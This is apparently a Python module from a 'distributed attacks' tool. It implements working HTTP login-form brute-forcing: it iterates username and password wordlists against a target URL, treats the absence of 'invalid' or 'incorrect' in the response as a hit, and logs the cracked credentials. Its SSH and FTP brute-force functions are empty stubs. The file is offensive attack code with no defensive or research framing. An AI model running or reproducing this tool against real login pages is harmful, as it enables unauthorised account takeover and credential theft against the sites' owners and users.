"""
Task execution logic for distributed attacks
"""
import requests
import time
import logging


def brute_force_login(target_url, username, wordlist_path, username_field='username', password_field='password', success_indicator=None):
    """
    Attempts to brute-force a login form at target_url using the given username and a wordlist file.
    - target_url: URL of the login form
    - username: Username to try
    - wordlist_path: Path to file with passwords (one per line)
    - username_field: Name of the username field in the form
    - password_field: Name of the password field in the form
    - success_indicator: Text or status code indicating successful login (optional)
    """
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]

    session = requests.Session()
    for password in passwords:
        data = {username_field: username, password_field: password}
        response = session.post(target_url, data=data)
        # Heuristic: If success_indicator is provided, use it; else, check if login failed by common patterns
        if success_indicator:
            if success_indicator in response.text or response.status_code == success_indicator:
                print(f"Password found: {password}")
                return password
        else:
            # If login failed, usually the page contains 'invalid' or 'incorrect' or status 200 with login form
            if not ("invalid" in response.text.lower() or "incorrect" in response.text.lower()):
                print(f"Password found: {password}")
                return password
        print(f"Tried: {password}")
    print("No password found.")
    return None


def brute_force_http(args):
    usernames = []
    if args.username:
        usernames.append(args.username)
    if args.userlist:
        with open(args.userlist, 'r', encoding='utf-8', errors='ignore') as f:
            usernames.extend([line.strip() for line in f if line.strip()])
    with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]

    target_url = args.target
    port = args.port
    if port:
        # Insert port into URL if not present
        if '://' in target_url:
            proto, rest = target_url.split('://', 1)
            if ':' not in rest.split('/')[0]:
                target_url = f"{proto}://{rest.split('/')[0]}:{port}/{'/'.join(rest.split('/')[1:])}"
    
    max_attempts = args.max_attempts if args.max_attempts else float('inf')
    attempt_count = 0
    found = False
    session = requests.Session()
    username_field = 'username'
    password_field = 'password'
    success_indicator = args.success_indicator
    log = logging.getLogger()
    verify_ssl = not getattr(args, 'no_verify_ssl', False)

    for username in usernames:
        for password in passwords:
            if attempt_count >= max_attempts:
                print("[!] Max attempts reached.")
                return
            data = {username_field: username, password_field: password}
            try:
                response = session.post(target_url, data=data, timeout=10, verify=verify_ssl)
            except Exception as e:
                print(f"[!] Error connecting: {e}")
                log.warning(f"Error for {username}:{password} - {e}")
                continue
            attempt_count += 1
            # Success detection
            if success_indicator:
                if success_indicator.isdigit():
                    if response.status_code == int(success_indicator):
                        print(f"[+] Password found! {username}:{password}")
                        log.info(f"SUCCESS {username}:{password}")
                        found = True
                        return
                else:
                    if success_indicator in response.text:
                        print(f"[+] Password found! {username}:{password}")
                        log.info(f"SUCCESS {username}:{password}")
                        found = True
                        return
            else:
                # Heuristic: if 'invalid' or 'incorrect' not in response, assume success
                if not ("invalid" in response.text.lower() or "incorrect" in response.text.lower()):
                    print(f"[+] Password found! {username}:{password}")
                    log.info(f"SUCCESS {username}:{password}")
                    found = True
                    return
            print(f"[-] Tried {username}:{password}")
            log.info(f"FAILED {username}:{password}")
            if args.delay:
                time.sleep(args.delay)
    if not found:
        print("[-] No password found.")
        log.info("No password found.")


def brute_force_ssh(args):
    print("[SSH] Brute force attack stub.")
    # TODO: Implement SSH brute force logic


def brute_force_ftp(args):
    print("[FTP] Brute force attack stub.")
    # TODO: Implement FTP brute force logic
